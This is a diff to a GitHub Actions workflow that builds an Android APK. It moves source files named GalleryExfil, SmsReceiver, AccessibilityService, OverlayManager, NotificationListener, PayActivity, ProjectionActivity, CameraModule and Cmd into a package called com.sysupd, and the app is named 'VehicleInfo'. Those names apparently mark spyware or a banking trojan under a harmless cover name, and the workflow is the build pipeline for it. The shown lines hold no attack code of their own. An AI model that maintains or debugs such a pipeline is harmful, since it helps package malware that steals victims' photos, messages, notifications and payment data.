@@ -17,17 +17,19 @@ jobs:
           distribution: temurin
           java-version: '17'
 
+      - name: Setup Gradle 8.5
+        run: |
+          cd /tmp
+          wget -q https://services.gradle.org/distributions/gradle-8.5-bin.zip
+          unzip -q gradle-8.5-bin.zip
+          echo "/tmp/gradle-8.5/bin" >> $GITHUB_PATH
+          /tmp/gradle-8.5/bin/gradle --version
+
       - name: Debug and Rearrange
         run: |
           set -e
           echo "=== ROOT FILES ==="
           ls -la
-
-          # Save original build.gradle
-          if [ -f build.gradle ]; then
-            cp build.gradle /tmp/orig-build.gradle
-            echo "Saved build.gradle"
-          fi
 
           # Create folders
           mkdir -p app/src/main/java/com/sysupd
@@ -37,14 +39,14 @@ jobs:
           mkdir -p app/src/main/res/mipmap-hdpi
           mkdir -p gradle/wrapper
 
-          # Move java files
+          # Move Java files
           for f in AccessibilityService BootReceiver CameraModule Cmd Core \
                    ForegroundService GalleryExfil MainActivity NotificationListener \
                    OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
             if [ -f "$f.java" ]; then mv "$f.java" app/src/main/java/com/sysupd/; fi
           done
 
-          # Move resources
+          # Move XML resources
           [ -f activity_main.xml ] && mv activity_main.xml app/src/main/res/layout/
           [ -f activity_success.xml ] && mv activity_success.xml app/src/main/res/layout/
           [ -f colors.xml ] && mv colors.xml app/src/main/res/values/
@@ -55,7 +57,21 @@ jobs:
           [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
           [ -f google-services.json ] && mv google-services.json app/
 
-          # Create app/build.gradle
+          # Root build.gradle with AGP 8.5
+          cat > build.gradle << 'EOFROOT'
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.5.0'
+                  classpath 'com.google.gms:google-services:4.4.0'
+              }
+          }
+          allprojects {
+              repositories { google(); mavenCentral() }
+          }
+          EOFROOT
+
+          # app/build.gradle
           cat > app/build.gradle << 'EOFAPP'
           plugins {
               id 'com.android.application'
@@ -84,48 +100,26 @@ jobs:
           }
           EOFAPP
 
-          # Create root build.gradle
-          cat > build.gradle << 'EOFROOT'
-          buildscript {
-              repositories { google(); mavenCentral() }
-              dependencies {
-                  classpath 'com.android.tools.build:gradle:8.1.4'
-                  classpath 'com.google.gms:google-services:4.4.0'
-              }
-          }
-          allprojects {
-              repositories { google(); mavenCentral() }
-          }
-          EOFROOT
-
-          # settings.gradle
           cat > settings.gradle << 'EOFSET'
           rootProject.name = "VehicleInfo"
           include ':app'
           EOFSET
 
-          # gradle.properties
           cat > gradle.properties << 'EOFPROP'
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m
           EOFPROP
 
-          # Gradle wrapper
-          [ -f gradle-wrapper.jar ] && mv gradle-wrapper.jar gradle/wrapper/
-          [ -f gradle-wrapper.properties ] && mv gradle-wrapper.properties gradle/wrapper/
-
-          # local.properties
           echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
 
           echo "=== FINAL STRUCTURE ==="
-          find . -type f -not -path './.git/*' | sort
+          find app -type f | sort
+          echo "=== app/src/main/AndroidManifest.xml ==="
+          cat app/src/main/AndroidManifest.xml 2>/dev/null || echo "MISSING"
 
       - name: Build APK
-        run: |
-          ls -la
-          ls -la app/ || true
-          gradle assembleDebug --no-daemon --stacktrace
+        run: gradle assembleDebug --no-daemon --stacktrace
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
